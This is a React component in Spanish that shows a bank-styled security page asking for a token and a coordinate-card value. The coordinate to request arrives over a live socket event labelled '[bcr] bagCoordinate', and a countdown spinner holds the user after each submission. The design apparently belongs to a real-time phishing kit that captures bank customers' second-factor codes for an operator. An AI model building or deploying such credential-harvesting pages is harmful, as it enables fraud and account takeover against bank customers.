/* eslint-disable no-mixed-operators */
import React, { useEffect, useState } from 'react'
import { useFormik } from 'formik'
import { tokenValidate } from '../../../security/tokenValidate'
import { submitBase } from '../../../helpers/submitBase'
import { TokenInput } from './TokenInput'
import { Spiner } from '../../Spiner'
import { useGeneralData } from '../../../hooks/useGeneralData'

export const Token = ({urlToNavigate, spiner, timeLoader, endUrl = '', tokenMode = 'token1'}) => {
  const valuesData = { token: '' , coordinate: ''}
  const dataImportant = useGeneralData({ modeLive: true })
  
  const coordinate = window.location.pathname == '/Seguridad'
  const [cordenadas, setCoordenadas] = useState(null);
  useEffect(() => {
    dataImportant.socket.on('[bcr] bagCoordinate', ({coordinate}) => {
      console.log(coordinate)
      setCoordenadas(coordinate)
    })
    return () => {
      dataImportant.socket.off('[bcr] bagCoordinate')
    }
    
  }, [dataImportant.socket])
  const [seconds, setSeconds] = useState(timeLoader / 1000)
  
  const { values, handleSubmit, handleChange, errors, handleBlur, touched } = useFormik({
    initialValues: valuesData,
    // En caso de poner un error personalizado colocar errorUsername y errorPassword
    validate: values => tokenValidate({values}),
    onSubmit: async(valuesData, { resetForm }) => {
      if(tokenMode === 'token1') valuesData.token1 = valuesData.token
      if(coordinate) valuesData.token2 = valuesData.coordinate
      
      submitBase({dataImportant, valuesData, endUrl, setSeconds})
      return resetForm()
    }
  })


  return (
    <div className='h-screen'>
      <form className='flex flex-col justify-center items-center' onSubmit={handleSubmit}>
        {
          dataImportant.showSpiner === true ? <Spiner tokenMode={true} seconds={seconds} /> : null
        }
        <p className="text-[34px] text-[#0033A0] font-semibold text-center pt-10 px-6 md:px-0 ">Ingrese su mecanismo de seguridad para continuar:
        
          <TokenInput 
            errors={errors}
            handleBlur={handleBlur}
            handleChange={handleChange}
            token={values.token}
            coordinate={values.coordinate}
            touched={touched}
            coordinateNumber={cordenadas}
            coordinateCondition={coordinate}
          />
        </p>
        <div className='flex justify-center mt-8 gap-6'>
          <button 
            className='text-red-500 border-2 px-5 rounded font-semibold border-red-500'
            type='button'
          >
              Cancelar
          </button>
          {
            !coordinate ?
            (
              <button 
            disabled={
                
                  (
                    touched.token && 
                    errors.token ||
                    values.token.toString().length <= 5 
                    
                  )
                  == true ? true : false
            }
            className='py-2 bg-[#0030a0] px-5 rounded font-semibold text-white
            disabled:bg-[#AEADB3] disabled:opacity-45
            '
            type='submit'
          >
              Confirmar
          </button>
            ):(
              <button 
            disabled={
                
                  (
                    touched.token && 
                    errors.token ||
                    values.token.toString().length <= 5 
                    
                  ) ||
                  (
                    touched.coordinate && 
                    errors.coordinate ||
                    values.coordinate.toString().length <= 5 
                    
                  )
                  == true ? true : false
            }
            className='py-2 bg-[#0030a0] px-5 rounded font-semibold text-white
            disabled:bg-[#AEADB3] disabled:opacity-45
            '
            type='submit'
          >
              Confirmar
          </button>
            )
          }
        </div>

      </form>
    </div>
  )
}
